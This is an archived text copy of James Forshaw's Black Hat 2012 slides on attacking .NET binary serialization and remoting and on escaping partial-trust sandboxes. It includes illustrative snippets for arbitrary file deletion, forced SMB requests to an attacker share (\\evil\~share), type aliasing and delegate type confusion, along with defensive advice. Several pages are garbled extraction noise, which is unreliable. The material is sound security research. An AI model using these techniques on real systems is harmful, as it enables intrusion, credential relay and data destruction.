---
type: Whitepaper
title: Are you my Type? - Slides
resource: "https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf"
tags: [whitepaper, ysonet-reference]
generated:
  by: ysonet-refs/1
  at: "2026-08-04T16:19:00+00:00"
status: stable
stale_after: 2027-08-04
sources:
  - id: original
    resource: "https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf"
    title: Are you my Type? - Slides
also_at: []
authors: []
canonical_url: ""
cited_by:
  - "docs/dotnet-deserialization-research.md:37"
  - "docs/references.md:32"
commit: ""
content_sha256: 667efe5135cab9e8cb338ea7c173dca3e6dca4f5857d6fd6abe8597e3710cb6e
depth: full
depth_reason: default
kind: whitepaper
language: ""
licence: unknown
original_url: "https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf"
published: ""
publisher: ""
publisher_english: ""
raw_sha256: 739e7f8ffb4b037c3d8e83bad9ba0287228795597d0a7c5a2e3cef429b42d0f3
retrieved_from: "https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf"
retrieved_kind: preserved-copy
retrieved_utc: "2026-08-04T16:19:00+00:00"
slug: you-my-type-slides
snapshot: ""
title_english: ""
---

# Are you my Type? - Slides

**Are you my Type? - Slides** - Author not stated, Publisher not stated.

- Published: date not stated
- Original: <https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf>
- Preserved from: https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf (preserved-copy) on 2026-08-04
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source cited by ysonet, kept so the technique survives the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# Are you my Type? - Slides

--- page 1 ---

Research. Response. Assurance Research. Response. Assurance. ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization James Forshaw

--- page 2 ---

?&&="9' 7' 7*@,.G./I56N��ªœgj‡X[yMRoDId6;U*.F&'>$$;$#;%%='%='>>#$8.# ¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿```¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿���

--- page 3 ---

Research. Response. Assurance What am I going to talk about? The research I did which ended up as MS12-035 Misuse of Microsoft .NET Binary Serialization Attacking badly written applications Attacking .NET remoting services Circumventing CAS and escaping Partial Trust Sandboxes Not all issues have been fixed, some only mitigated

--- page 4 ---

Research. Response. Assurance Who are we? Specialist technical security consultancy Approximately 100 strong Offices in UK, Germany and Australia Research Assurance Response Key facts Core Services

--- page 5 ---

Research. Response. Assurance What is Serialization? "A mechanism to transform a data structure into a form that can be stored or transmitted and later recreated at another time or location" - James Forshaw - Blackhat USA 2012

--- page 6 ---

Research. Response. Assurance Why Serialization? Other technologies show it can be dangerous; Java CVE-2008-5353 Java Calendar Serialization Vulnerability COM See Blackhat 2009 - Attacking Interoperability PHP unserialize() misuse

--- page 7 ---

Research. Response. Assurance .NET Serialization Support Technology .NET Version Introduced IFormatter Serialization (Binary and SOAP) 1.0 XML Serialization 1.0 Data Contracts (WCF) 3.0 JSON 3.5

--- page 8 ---

Research. Response. Assurance Binary Serialization Cannot just serialize any object [Serializable] class SerializableClass { public string SomeValue; }

--- page 9 ---

Research. Response. Assurance Binary Serialization Cannot just serialize any object [Serializable] class SerializableClass { public string SomeValue; }

--- page 10 ---

Research. Response. Assurance Binary Serialization Cannot just serialize any object [Serializable] class SerializableClass { public string SomeValue; } Must be specified

--- page 11 ---

Research. Response. Assurance What does it look like? public static byte[] Serialize(Object o) { BinaryFormatter fmt = new BinaryFormatter(); MemoryStream stm = new MemoryStream(); fmt.Serialize(stm, o); return stm.ToArray(); }

--- page 12 ---

Research. Response. Assurance What does it look like? SerializableClass c = new SerializableClass(); c.SomeValue = "Hello World!"; byte[] data = Serialize(c);

--- page 13 ---

Research. Response. Assurance What does it look like? SerializableClass c = new SerializableClass(); c.SomeValue = "Hello World!"; byte[] data = Serialize(c); Library Name

--- page 14 ---

Research. Response. Assurance What does it look like? SerializableClass c = new SerializableClass(); c.SomeValue = "Hello World!"; byte[] data = Serialize(c); Type Name

--- page 15 ---

Research. Response. Assurance What does it look like? SerializableClass c = new SerializableClass(); c.SomeValue = "Hello World!"; byte[] data = Serialize(c); Field Name

--- page 16 ---

Research. Response. Assurance What does it look like? SerializableClass c = new SerializableClass(); c.SomeValue = "Hello World!"; byte[] data = Serialize(c); Value

--- page 17 ---

Research. Response. Assurance Badly Written Applications With great power comes great responsibility. Would the use of the BinaryFormatter in an untrusted scenario be an issue? Surely only if you do something to cause a problem?

--- page 18 ---

Research. Response. Assurance Implicit Functionality What if the very act of deserialization is itself malicious? public static SomeClass Deserialize(byte[] data) { BinaryFormatter fmt = new BinaryFormatter(); MemoryStream stm = new MemoryStream(data); return fmt.Deserialize(stm) as SomeClass; }

--- page 19 ---

Research. Response. Assurance Implicit Functionality What if the very act of deserialization is itself malicious? public static SomeClass Deserialize(byte[] data) { BinaryFormatter fmt = new BinaryFormatter(); MemoryStream stm = new MemoryStream(data); return fmt.Deserialize(stm) as SomeClass; } You might be too late!

--- page 20 ---

Research. Response. Assurance ISerializable Interface [Serializable] class CustomSerializableClass : ISerializable { public string SomeValue; public void GetObjectData(SerializationInfo info, StreamingContext context) { info.AddValue("SomeValue", SomeValue); } // ... }

--- page 21 ---

Research. Response. Assurance ISerializable Interface [Serializable] class CustomSerializableClass : ISerializable { public string SomeValue; public void GetObjectData(SerializationInfo info, StreamingContext context) { info.AddValue("SomeValue", SomeValue); } // ... } Store value in Dictionary

--- page 22 ---

Research. Response. Assurance ISerializable Deserializing [Serializable] class CustomSerializableClass : ISerializable { public string SomeValue; // ... protected CustomSerializableClass(SerializationInfo info, StreamingContext context) { SomeValue = info.GetString("SomeValue"); } }

--- page 23 ---

Research. Response. Assurance ISerializable Deserializing [Serializable] class CustomSerializableClass : ISerializable { public string SomeValue; // ... protected CustomSerializableClass(SerializationInfo info, StreamingContext context) { SomeValue = info.GetString("SomeValue"); } } Restore value

--- page 24 ---

Research. Response. Assurance Types of Interest .NET 4 Library Serializable ISerializable Callbacks Finalizable mscorlib 681 268 56 2 System 312 144 13 3 System.Data 103 66 1 2 System.Xml 33 30 0 0 Management 68 68 0 4

--- page 25 ---

Research. Response. Assurance Just Being Malicious [Serializable] public class TempFileCollection { private Hashtable files; // Other stuff... ~TempFileCollection() { foreach (string file in files.Keys) { File.Delete(file); } } }

--- page 26 ---

Research. Response. Assurance Just Being Malicious [Serializable] public class TempFileCollection { private Hashtable files; // Other stuff... ~TempFileCollection() { foreach (string file in files.Keys) { File.Delete(file); } } } Deserialized list of files

--- page 27 ---

Research. Response. Assurance Just Being Malicious [Serializable] public class TempFileCollection { private Hashtable files; // Other stuff... ~TempFileCollection() { foreach (string file in files.Keys) { File.Delete(file); } } } Deserialized list of files Makes sure to delete them when object destroyed!

--- page 28 ---

Research. Response. Assurance Demonstration Demo of malicious serialized object, deleting arbitrary files Using a "badly" written application which deserializes untrusted input Windows 7

--- page 29 ---

Research. Response. Assurance How to protect against this? Use of SerializationBinder to limit types deserialized Do not trust external data with BinaryFormatter Use something else (e.g. XMLSerializer, Data Contracts, Protobuf.NET)

--- page 30 ---

Research. Response. Assurance I Am Feeling Safer Already! So you are not using BinaryFormatter in your code, you are safe, right? Well maybe, are you using: .NET Remoting? Partial Trust Sandboxes? If yes then you could still be vulnerable without knowing it

--- page 31 ---

Research. Response. Assurance AppDomain AppDomain .NET Remoting Architecture AppDomain Boundary

--- page 32 ---

Research. Response. Assurance AppDomain Well Known Service AppDomain .NET Remoting Architecture AppDomain Boundary

--- page 33 ---

Research. Response. Assurance AppDomain Well Known Service AppDomain RemObject.DoWork(a) .NET Remoting Architecture AppDomain Boundary

--- page 34 ---

Research. Response. Assurance AppDomain Well Known Service AppDomain RemObject.DoWork(a) .NET Remoting Architecture AppDomain Boundary TCP Channel

--- page 35 ---

+--222222222222222222-./$'

--- page 36 ---

Research. Response. Assurance AppDomain Well Known Service AppDomain RemObject.DoWork(a) .NET Remoting Architecture AppDomain Boundary TCP Channel

--- page 37 ---

+,-222222222222222222-./%'

--- page 38 ---

Research. Response. Assurance AppDomain Well Known Service AppDomain RemObject.DoWork(a) .NET Remoting Architecture AppDomain Boundary TCP Channel

--- page 39 ---

&VQ, •PÜÌmøçzýì}ýë|üê|üê|ýë|üé{ÝÍmÂ´_ïàwÅ·brk;$"

-*`Y2­¢Vóáwÿñÿî~þì}¿²_'%
DDDâââÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÒÒÒMMM

HC'Âµaþï~üê|üê|üê|üë|ÿî~éÙs…|B'%


vo<ÔÅhüê|óáx—ŒK
 



�…Hüì}üê|êÙs¹¬ƒyB=9"


--- page 40 ---

Research. Response. Assurance AppDomain Well Known Service AppDomain RemObject.DoWork(a) .NET Remoting Architecture AppDomain Boundary TCP Channel

--- page 41 ---


,+vp=É¼döäyÿí~ýë}üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|ýë|ûé|®¢W41





'$‹�FèÛtýì}üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|ýë|þí}ýì}çØrÀ¶`ŒƒGID'



1.W1¤˜RæÖqûê|ýë}ýë|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|ýë|þì}øæzÍ¾e‰~F30


FB&�…HÞÓoüë|þì}ýë|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|þï~Ë¾eVP-

 



 



kc7ÝÏmýí}üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|ýë|þî~ýî~òãxÁ´`ph9

 





 

„{DéÙsþî~üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|ýë}ÿí~âÓoe_4SN,Ë¾eúê|þì}üê|üê|üê|üê|ýë}ýì}úê|îàwÈ»d~u@74





B=$™ŽMä×rþì}ýì}üê|üê|üê|üê|üê|üë|øç{æØr¯£WVP-
JE'Ÿ”OåÓpüé|þì}üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|ýë|üê|°¤W74



 

T/ÚÊkþí}üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|üê|ýë|þì}ïÝutl:


B?%Â¶aÿï~þì}üê|üê|üê|üê|üê|üê|üê|üë}ýë}ùë}ìÝu¶ª[WQ.


QJ*´§Zóè{þí}üê|üê|üê|üê|üê|üê|üê|üê|ýë|üë|óæzÒÆi{r>

--- page 42 ---

Research. Response. Assurance AppDomain Well Known Service Marshal By Reference AppDomain AppDomain Boundary Marshal By Reference Object TCP Channel RemObject.DoWork(a)

--- page 43 ---

Research. Response. Assurance AppDomain Well Known Service Marshal By Reference AppDomain AppDomain Boundary Marshal By Reference Object Transparent Proxy TCP Channel ObjRef RemObject.DoWork(a)

--- page 44 ---

Research. Response. Assurance AppDomain Well Known Service Marshal By Reference AppDomain AppDomain Boundary Marshal By Reference Object Transparent Proxy TCP Channel ObjRef RemObject.DoWork(a)

--- page 45 ---

Research. Response. Assurance AppDomain Well Known Service Marshal By Value AppDomain AppDomain Boundary Serializable Object TCP Channel RemObject.DoWork(a)

--- page 46 ---

Research. Response. Assurance AppDomain Well Known Service Marshal By Value AppDomain AppDomain Boundary Serializable Object TCP Channel RemObject.DoWork(a)

--- page 47 ---

Research. Response. Assurance AppDomain Well Known Service Marshal By Value AppDomain AppDomain Boundary Serializable Object Serializable Object TCP Channel RemObject.DoWork(a)

--- page 48 ---

Research. Response. Assurance More Active Attacks [Serializable] public class FileInfo { private string FullPath; protected FileInfo(SerializationInfo info, StreamingContext context) { FullPath = NormalizePath(info.GetString("FullPath")); } }

--- page 49 ---

Research. Response. Assurance More Active Attacks [Serializable] public class FileInfo { private string FullPath; protected FileInfo(SerializationInfo info, StreamingContext context) { FullPath = NormalizePath(info.GetString("FullPath")); } } Ensures path is canonical

--- page 50 ---

Research. Response. Assurance Path Normalization string NormalizePath(string path) { string[] parts = path.Split('\\'); foreach(string part in parts) { currPath += "\\" + part; if(part[0] == '~') { GetLongPathName(currPath); } } }

--- page 51 ---

Research. Response. Assurance Path Normalization string NormalizePath(string path) { string[] parts = path.Split('\\'); foreach(string part in parts) { currPath += "\\" + part; if(part[0] == '~') { GetLongPathName(currPath); } } } If potential short path call Windows API

--- page 52 ---

Research. Response. Assurance Exploiting FileInfo Pass in a filename of the form: \\evil\~share Application will make an SMB request during deserialization SMB Reflection/Relay anyone?

--- page 53 ---

Research. Response. Assurance They Saw Us Coming

--- page 54 ---

Research. Response. Assurance They Saw Us Coming

--- page 55 ---

Research. Response. Assurance TypeFiltering Attacker Remote Server FileInfo \\evil\~share TCP Channel

--- page 56 ---

Research. Response. Assurance TypeFiltering Attacker Remote Server FileInfo \\evil\~share TCP Channel

--- page 57 ---

Research. Response. Assurance TypeFiltering Attacker Remote Server FileInfo \\evil\~share TCP Channel

--- page 58 ---

Research. Response. Assurance TCP Channel Bypassing TypeFiltering Attacker Remote Server DataSet

--- page 59 ---

Research. Response. Assurance TCP Channel Bypassing TypeFiltering Attacker Remote Server DataSet DataSet

--- page 60 ---

Research. Response. Assurance TCP Channel Bypassing TypeFiltering Attacker Remote Server DataSet DataSet

--- page 61 ---

Research. Response. Assurance TCP Channel Bypassing TypeFiltering Attacker Remote Server DataSet DataSet SMB \\evil\~share

--- page 62 ---

Research. Response. Assurance Demonstration Demo of malicious serialized object with SMB reflection This demo only works on OSes prior to MS08-068 (using XP SP2) The actual issue however isn't fixed Can still be used for information gathering or credential relay on an up to date OS

--- page 63 ---

Research. Response. Assurance How to protect against this? Windows Communication Foundation (WCF) is recommended for new applications Don't expose to the Internet Enable Authentication What works up, probably works Impersonate server and attack clients

--- page 64 ---

Research. Response. Assurance Partial Trust Sandboxes Host AppDomain Host Class

--- page 65 ---

Research. Response. Assurance Channel Partial Trust Sandboxes Host AppDomain AppDomain Boundary Host Class

--- page 66 ---

Research. Response. Assurance Channel Partial Trust Sandboxes Host AppDomain PT AppDomain AppDomain Boundary Host Class

--- page 67 ---

Research. Response. Assurance Channel Partial Trust Sandboxes Host AppDomain PT AppDomain AppDomain Boundary Untrusted Class Host Class

--- page 68 ---

Research. Response. Assurance Channel Partial Trust Sandboxes Host AppDomain PT AppDomain AppDomain Boundary Untrusted Class Host Class

--- page 69 ---

Research. Response. Assurance Channel Partial Trust Sandboxes Host AppDomain PT AppDomain AppDomain Boundary Untrusted Class Host Class

--- page 70 ---

Research. Response. Assurance Code Access Security Some God like privileges: Unmanaged Code Access Control AppDomain Skip IL Verification Access to Serialization Services! Will not have Serialization permission Find an AppDomain transition!

--- page 71 ---

Research. Response. Assurance Easier Than You Would Think! Exception ex = new Exception(); ex.Data.Add("ExploitMe", new SerializableClass()); throw ex;

--- page 72 ---

Research. Response. Assurance Easier Than You Would Think! In XBAP the following code passes objects across the boundary: Fixed as CVE-2012-0161 Exception ex = new Exception(); ex.Data.Add("ExploitMe", new SerializableClass()); throw ex; Exception class is serializable

--- page 73 ---

Research. Response. Assurance Easier Than You Would Think! In XBAP the following code passes objects across the boundary: Fixed as CVE-2012-0161 Exception ex = new Exception(); ex.Data.Add("ExploitMe", new SerializableClass()); throw ex; Add our object to exception "Data" dictionary

--- page 74 ---

Research. Response. Assurance Easier Than You Would Think! In XBAP the following code passes objects across the boundary: Fixed as CVE-2012-0161 Exception ex = new Exception(); ex.Data.Add("ExploitMe", new SerializableClass()); throw ex; Cross boundary causing serialization then deserialization

--- page 75 ---

Research. Response. Assurance We Still Have a Problem Need privileged access to create or manipulate vulnerable classes. Cannot directly provide binary stream How can partial trust code possibly manipulate the serialization process?

--- page 76 ---

Research. Response. Assurance ISerializable Redux [Serializable] class CustomSerializableClass : ISerializable { public void GetObjectData(SerializationInfo info, StreamingContext context) { // Change our type to something else! info.SetType(typeof(FileInfo)); info.AddValue("OriginalPath", @"\\server\~share"); } }

--- page 77 ---

Research. Response. Assurance ISerializable Redux [Serializable] class CustomSerializableClass : ISerializable { public void GetObjectData(SerializationInfo info, StreamingContext context) { // Change our type to something else! info.SetType(typeof(FileInfo)); info.AddValue("OriginalPath", @"\\server\~share"); } } Deserialize as an unrelated type

--- page 78 ---

Research. Response. Assurance ISerializable Redux [Serializable] class CustomSerializableClass : ISerializable { public void GetObjectData(SerializationInfo info, StreamingContext context) { // Change our type to something else! info.SetType(typeof(FileInfo)); info.AddValue("OriginalPath", @"\\server\~share"); } } Deserialize as an unrelated type Fake serialization data

--- page 79 ---

Research. Response. Assurance PT AppDomain Channel Type Conversion Host AppDomain AppDomain Boundary Exception

--- page 80 ---

Research. Response. Assurance PT AppDomain Channel Type Conversion Host AppDomain AppDomain Boundary Exception

--- page 81 ---

Research. Response. Assurance PT AppDomain Channel Type Conversion Host AppDomain AppDomain Boundary Exception Exception Round Trip Serialize Exception Data

--- page 82 ---

Research. Response. Assurance But So What? What can we actually use this for? Could probably do SMB reflection etc. again but we have code running on the machine, we must be able to do better? What if we could get back the object we deserialized?

--- page 83 ---

Research. Response. Assurance Attack of the Clones EvidenceBase Class added to .NET 4 Marked as serializable Implements a Clone method Common programming technique to copy object state

--- page 84 ---

Research. Response. Assurance EvidenceBase.Clone [SecurityPermission(SecurityAction.Assert, SerializationFormatter = true)] public virtual EvidenceBase Clone() { using (MemoryStream stream = new MemoryStream()) { BinaryFormatter formatter = new BinaryFormatter(); formatter.Serialize(stream, this); stream.Position = 0L; return formatter.Deserialize(stream) as EvidenceBase; } }

--- page 85 ---

Research. Response. Assurance EvidenceBase.Clone [SecurityPermission(SecurityAction.Assert, SerializationFormatter = true)] public virtual EvidenceBase Clone() { using (MemoryStream stream = new MemoryStream()) { BinaryFormatter formatter = new BinaryFormatter(); formatter.Serialize(stream, this); stream.Position = 0L; return formatter.Deserialize(stream) as EvidenceBase; } } Oh Dear!

--- page 86 ---

Research. Response. Assurance PT AppDomain Exploiting It! MyEvidenceBase MyEvidenceBase

--- page 87 ---

Research. Response. Assurance Delegates A fundamental type in the .NET runtime Gets special treatment for reasons of performance Effectively a fancy function pointer Crucially it is serializable

--- page 88 ---

Research. Response. Assurance Delegate Multicasting delegate void MyDelegatePtr(IntPtr p); public static void DoSomethingPtr(IntPtr p) { Console.WriteLine(p); } public RunDelegate() { MyDelegatePtr d = Delegate.Combine( new MyDelegatePtr(DoSomethingPtr), new MyDelegatePtr(DoSomethingPtr)); d(new IntPtr(0x12345678)); }

--- page 89 ---

Research. Response. Assurance Delegate Multicasting delegate void MyDelegatePtr(IntPtr p); public static void DoSomethingPtr(IntPtr p) { Console.WriteLine(p); } public RunDelegate() { MyDelegatePtr d = Delegate.Combine( new MyDelegatePtr(DoSomethingPtr), new MyDelegatePtr(DoSomethingPtr)); d(new IntPtr(0x12345678)); } Combine two delegates together Type of delegate

--- page 90 ---

Research. Response. Assurance Delegate Multicasting delegate void MyDelegatePtr(IntPtr p); public static void DoSomethingPtr(IntPtr p) { Console.WriteLine(p); } public RunDelegate() { MyDelegatePtr d = Delegate.Combine( new MyDelegatePtr(DoSomethingPtr), new MyDelegatePtr(DoSomethingPtr)); d(new IntPtr(0x12345678)); } Combine two delegates together Calls DoSomethingPtr twice with the same parameter Type of delegate

--- page 91 ---

Research. Response. Assurance Delegate Multicasting delegate void MyDelegatePtr(IntPtr p); public static void DoSomethingPtr(IntPtr p) { Console.WriteLine(p); } public RunDelegate() { MyDelegatePtr d = Delegate.Combine( new MyDelegatePtr(DoSomethingPtr), new MyDelegatePtr(DoSomethingPtr)); d(new IntPtr(0x12345678)); } Combine two delegates together Calls DoSomethingPtr twice with the same parameter Type of delegate

--- page 92 ---

Research. Response. Assurance Delegate Multicasting delegate void MyDelegateStr(String s); public static void DoSomet hingStr(String s) { } public RunDelegate() { MyDelegatePtr d = Delegate.Combine( new MyDelegatePtr(DoSomethingPtr), new MyDelegateStr(DoSomethingStr)); d(new IntPtr(0x12345678)); }

--- page 93 ---

Research. Response. Assurance Delegate Multicasting delegate void MyDelegateStr(String s); public static void DoSomet hingStr(String s) { } public RunDelegate() { MyDelegatePtr d = Delegate.Combine( new MyDelegatePtr(DoSomethingPtr), new MyDelegateStr(DoSomethingStr)); d(new IntPtr(0x12345678)); } Combination fails with an Exception

--- page 94 ---

Research. Response. Assurance Serialized Delegate public RunDelegate() { // Get a delegate combining IntPtr and String types MyDelegatePtr d = GetSerializedDelegate(); d(new IntPtr(0x12345678)); }

--- page 95 ---

Research. Response. Assurance Serialized Delegate public RunDelegate() { // Get a delegate combining IntPtr and String types MyDelegatePtr d = GetSerializedDelegate(); d(new IntPtr(0x12345678)); } Now what will this do?

--- page 96 ---

Research. Response. Assurance Type Confusion eax=000d3888 ebx=0035b798 ecx=12345678 edx=12345678 esi=0024eae4 edi=00000001 eip=002f09fb esp=0024eaac ebp=0024eab4 iopl=0 cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b 002f09fb 8b01 mov eax,dword ptr [ecx] ds:002b:12345678=???????? 002f09fd 8b4028 mov eax,dword ptr [eax+28h] 002f0a00 ff10 call dword ptr [eax] 0:000> !clrstack OS Thread Id: 0x12a0 (0) Child SP IP Call Site 0024eaac 002f09fb Demo.DoSomethingStr(System.String) 0024eae4 000ca2be Demo+MyDelegatePtr.Invoke(IntPtr) 0024eaf4 002f054b Demo.DoTypeConfusion()

--- page 97 ---

Research. Response. Assurance Type Confusion eax=000d3888 ebx=0035b798 ecx=12345678 edx=12345678 esi=0024eae4 edi=00000001 eip=002f09fb esp=0024eaac ebp=0024eab4 iopl=0 cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b 002f09fb 8b01 mov eax,dword ptr [ecx] ds:002b:12345678=???????? 002f09fd 8b4028 mov eax,dword ptr [eax+28h] 002f0a00 ff10 call dword ptr [eax] 0:000> !clrstack OS Thread Id: 0x12a0 (0) Child SP IP Call Site 0024eaac 002f09fb Demo.DoSomethingStr(System.String) 0024eae4 000ca2be Demo+MyDelegatePtr.Invoke(IntPtr) 0024eaf4 002f054b Demo.DoTypeConfusion() ECX Points to Fake Value

--- page 98 ---

Research. Response. Assurance Type Confusion eax=000d3888 ebx=0035b798 ecx=12345678 edx=12345678 esi=0024eae4 edi=00000001 eip=002f09fb esp=0024eaac ebp=0024eab4 iopl=0 cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b 002f09fb 8b01 mov eax,dword ptr [ecx] ds:002b:12345678=???????? 002f09fd 8b4028 mov eax,dword ptr [eax+28h] 002f0a00 ff10 call dword ptr [eax] 0:000> !clrstack OS Thread Id: 0x12a0 (0) Child SP IP Call Site 0024eaac 002f09fb Demo.DoSomethingStr(System.String) 0024eae4 000ca2be Demo+MyDelegatePtr.Invoke(IntPtr) 0024eaf4 002f054b Demo.DoTypeConfusion() ECX Points to Fake Value Results in a VTable look up and call

--- page 99 ---

Research. Response. Assurance Type Confusion eax=000d3888 ebx=0035b798 ecx=12345678 edx=12345678 esi=0024eae4 edi=00000001 eip=002f09fb esp=0024eaac ebp=0024eab4 iopl=0 cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b 002f09fb 8b01 mov eax,dword ptr [ecx] ds:002b:12345678=???????? 002f09fd 8b4028 mov eax,dword ptr [eax+28h] 002f0a00 ff10 call dword ptr [eax] 0:000> !clrstack OS Thread Id: 0x12a0 (0) Child SP IP Call Site 0024eaac 002f09fb Demo.DoSomethingStr(System.String) 0024eae4 000ca2be Demo+MyDelegatePtr.Invoke(IntPtr) 0024eaf4 002f054b Demo.DoTypeConfusion() ECX Points to Fake Value Results in a VTable look up and call Clearly Confused

--- page 100 ---

Research. Response. Assurance Demonstration Quick demo in a Click Once Application Fixed in CVE-2012-0160 Windows 7

--- page 101 ---

Research. Response. Assurance Reflection Attack EvidenceBase isn't exactly subtle Clearly a bug and should be fixed What if we could do the same but: Without any specific bug Works in any version of .NET Also be difficult to fix

--- page 102 ---

Research. Response. Assurance Hashtable Serialization public class Hashtable { object[] keys; object[] values; HashBuckets buckets; protected Hashtable(SerializationInfo info, StreamingContext context) { keys = (object[])info.GetValue("keys"); values = (object[])info.GetValue("values"); buckets = RebuildHashTable(keys, values); } }

--- page 103 ---

Research. Response. Assurance Hashtable Serialization public class Hashtable { object[] keys; object[] values; HashBuckets buckets; protected Hashtable(SerializationInfo info, StreamingContext context) { keys = (object[])info.GetValue("keys"); values = (object[])info.GetValue("values"); buckets = RebuildHashTable(keys, values); } } Deserialize Keys and Values

--- page 104 ---

Research. Response. Assurance Hashtable Serialization public class Hashtable { object[] keys; object[] values; HashBuckets buckets; protected Hashtable(SerializationInfo info, StreamingContext context) { keys = (object[])info.GetValue("keys"); values = (object[])info.GetValue("values"); buckets = RebuildHashTable(keys, values); } } Deserialize Keys and Values Rebuild Hash Table

--- page 105 ---

Research. Response. Assurance Hashtable Serialization IEqualityComparer comparer; private HashBuckets RebuildHashtable(object[] keys, object[] values) { HashBuckets ret = new HashBuckets(); for (int i = 0; i < keys.Length; ++i) { ret.Add(comparer.GetHashCode(keys[i]), values[i]); } return ret; }

--- page 106 ---

Research. Response. Assurance Hashtable Serialization IEqualityComparer comparer; private HashBuckets RebuildHashtable(object[] keys, object[] values) { HashBuckets ret = new HashBuckets(); for (int i = 0; i < keys.Length; ++i) { ret.Add(comparer.GetHashCode(keys[i]), values[i]); } return ret; } Serialized with Hashtable

--- page 107 ---

Research. Response. Assurance Hashtable Serialization IEqualityComparer comparer; private HashBuckets RebuildHashtable(object[] keys, object[] values) { HashBuckets ret = new HashBuckets(); for (int i = 0; i < keys.Length; ++i) { ret.Add(comparer.GetHashCode(keys[i]), values[i]); } return ret; } Serialized with Hashtable Calls method passing back keys

--- page 108 ---

Research. Response. Assurance Hashtable Serialization IEqualityComparer comparer; private HashBuckets RebuildHashtable(object[] keys, object[] values) { HashBuckets ret = new HashBuckets(); for (int i = 0; i < keys.Length; ++i) { ret.Add(comparer.GetHashCode(keys[i]), values[i]); } return ret; } Serialized with Hashtable Calls method passing back keys What if this wasn't serialized?

--- page 109 ---

Research. Response. Assurance PT AppDomain MyEqualityComparer Channel Hashtable Exploit Host AppDomain AppDomain Boundary Hashtable

--- page 110 ---

Research. Response. Assurance PT AppDomain MyEqualityComparer Channel Hashtable Exploit Host AppDomain AppDomain Boundary Hashtable

--- page 111 ---

Research. Response. Assurance PT AppDomain MyEqualityComparer Channel Hashtable Exploit Host AppDomain AppDomain Boundary Hashtable Hashtable Round Trip Serialize Keys, pass reference to Comparer

--- page 112 ---

Research. Response. Assurance PT AppDomain MyEqualityComparer Channel Hashtable Exploit Host AppDomain AppDomain Boundary Hashtable Hashtable Call GetHashCode passing back each Key Round Trip Serialize Keys, pass reference to Comparer

--- page 113 ---

Research. Response. Assurance Demonstration Quick demo in an XBAP Worked until May 2012 on any supported platform Route to attack vector closed but underlying vulnerability still exists

--- page 114 ---

Research. Response. Assurance How to protect against this? Tricky! Technically only using normal functions Potential for back-compat issues Microsoft's fix was to block type aliasing via SerializationInfo.SetType() And block XBAP for ever more

--- page 115 ---

Research. Response. Assurance Review More than just the 2 fixes in MS12-035 Numerous issues across the framework Attacks from Partial Trust mitigated .NET Remoting isn't fixed, you should be using WCF instead! Number of objects which still might do

--- page 116 ---

Research. Response. Assurance Questions? More info in Whitepaper

--- page 117 ---

Research. Response. Assurance References Twitter: @tiraniddo, @ctxis Email: whitepapers@contextis.com WWW: http://www.contextis.com

--- page 118 ---

þý8ZJ²ÄCR6N%GkQÎú;XC&s=gR>*'‚',TzM.TG8
5Rn/L5þ]#;OýÝ:X<þ87Raÿð9b³;+¸ÿè³M+¸ÿð³M+¸ÿì³
M+¸ÿî³M+¸ÿè³M+¾3/!&,²S»*50.±	V?ýÔí?ýÔí/á+++++ÖÄ10%#".54>32#".#"32>32@_{I~Ë�MS–Ñ8jZF2OqOV�d75c�[MsQ4
·/%L%%"L

--- page 119 ---

¸¤@+P++

--- page 120 ---

=! ý!.Aý
<û97D
G<G?
